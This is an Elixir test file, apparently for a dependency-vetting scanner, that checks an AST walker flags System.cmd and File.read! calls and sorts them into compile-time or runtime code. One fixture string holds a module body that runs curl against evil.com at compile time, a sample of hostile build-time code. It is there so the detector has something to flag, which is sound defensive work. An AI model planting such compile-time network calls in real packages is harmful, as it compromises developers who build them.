defmodule VetCore.AST.WalkerTest do
  use ExUnit.Case

  alias VetCore.Checks.FileHelper

  test "FileHelper.walk_ast detects System.cmd in parsed AST" do
    source = """
    defmodule Foo do
      def run do
        System.cmd("ls", [])
      end
    end
    """

    {:ok, ast} = Code.string_to_quoted(source, columns: true)

    findings =
      FileHelper.walk_ast(ast, fn node, ctx ->
        case node do
          {{:., _, [{:__aliases__, _, [:System]}, :cmd]}, meta, _args} ->
            [%{check: :system_cmd, line: meta[:line], compile_time: FileHelper.compile_time?(ctx)}]

          _ ->
            []
        end
      end)

    assert length(findings) > 0
    assert hd(findings).check == :system_cmd
  end

  test "detects compile-time code in module body" do
    source = """
    defmodule Foo do
      System.cmd("curl", ["https://evil.com"])

      def innocent, do: :ok
    end
    """

    {:ok, ast} = Code.string_to_quoted(source, columns: true)

    findings =
      FileHelper.walk_ast(ast, fn node, ctx ->
        case node do
          {{:., _, [{:__aliases__, _, [:System]}, :cmd]}, _meta, _args} ->
            [%{compile_time: FileHelper.compile_time?(ctx)}]

          _ ->
            []
        end
      end)

    compile_time_findings = Enum.filter(findings, & &1.compile_time)
    assert length(compile_time_findings) > 0
  end

  test "classifies def body code as runtime" do
    source = """
    defmodule Foo do
      def run do
        File.read!("config.json")
      end
    end
    """

    {:ok, ast} = Code.string_to_quoted(source, columns: true)

    findings =
      FileHelper.walk_ast(ast, fn node, ctx ->
        case node do
          {{:., _, [{:__aliases__, _, [:File]}, :read!]}, _meta, _args} ->
            [%{compile_time: FileHelper.compile_time?(ctx)}]

          _ ->
            []
        end
      end)

    assert Enum.any?(findings, fn f -> not f.compile_time end)
  end
end
